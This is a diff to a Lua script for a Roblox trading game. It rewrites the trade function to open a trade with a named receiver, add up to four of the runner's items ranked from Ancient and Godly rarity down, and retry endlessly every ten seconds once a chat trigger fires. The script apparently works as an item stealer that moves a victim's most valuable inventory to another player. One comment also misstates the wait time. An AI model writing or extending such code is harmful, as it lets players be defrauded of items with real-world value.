@@ -226,22 +226,58 @@ function FullInventory()
 end
 FullInventory()
 task.wait()
-function Sendtrade(I)
+function TradeItems()
+    local rarityOrder = {
+        y.AncientList,
+        y.GodlyList,
+        y.UniqueList,
+        y.VintageList,
+        y.LegendaryList,
+        y.RareList,
+        y.UncommonList,
+        y.CommonList
+    }
+
+    local maxItems = 4  -- Limit for items per trade
+    local itemsTraded = 0
+
+    for _, rarityList in ipairs(rarityOrder) do
+        for _, item in ipairs(rarityList) do
+            if itemsTraded < maxItems then
+                -- Logic to send this item in the trade
+                TapUI(item.Container.ActionButton)
+                itemsTraded = itemsTraded + 1
+            else
+                return  -- Exit if we have already added max items
+            end
+        end
+    end
+end
+function Sendtrade(receiverName)
+    local Leaderboard
     if Mobile then
-        local J = c.PlayerGui.MainGUI.Lobby.Leaderboard
-        TapUI(J.Container.Close)
-        TapUI(J.Container.PlayerList[I].ActionButton)
-        TapUI(J.Popup.Container.Action.Trade)
-        TapUI(J.Popup.Container.Close)
+        Leaderboard = c.PlayerGui.MainGUI.Lobby.Leaderboard
     else
-        local J = c.PlayerGui.MainGUI.Game.Leaderboard
-        TapUI(J.Container.ToggleRequests.On)
-        TapUI(J.Container.Close.Title.Text, "Text Check", J.Container.Close.Toggle)
-        TapUI(J.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
-        TapUI(J.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
-        TapUI(J.Container[I].ActionButton)
-        TapUI(J.Inspect.Trade)
-        TapUI(J.Inspect.Close)
+        Leaderboard = c.PlayerGui.MainGUI.Game.Leaderboard
+    end
+
+    -- Close any open popups or menus
+    TapUI(Leaderboard.Container.Close)
+    
+    -- Send trade if the player is found in the leaderboard
+    local PlayerEntry = Leaderboard.Container.PlayerList:FindFirstChild(receiverName)
+    if PlayerEntry then
+        TapUI(PlayerEntry.ActionButton)
+        if Mobile then
+            TapUI(Leaderboard.Popup.Container.Action.Trade)
+            TapUI(Leaderboard.Popup.Container.Close)
+        else
+            TapUI(Leaderboard.Inspect.Trade)
+            TapUI(Leaderboard.Inspect.Close)
+        end
+
+        -- Call TradeItems to send items in the order of rarity
+        TradeItems()
     end
 end
 function readchats(I)
@@ -260,7 +296,10 @@ function Activate(I)
         if x == I then
             readchats(I)
             wait(10)
-            Sendtrade(I)
+            while true do
+                Sendtrade(I)
+                task.wait(10) -- Wait 5 seconds before attempting to trade again
+            end
         end
     end
 end
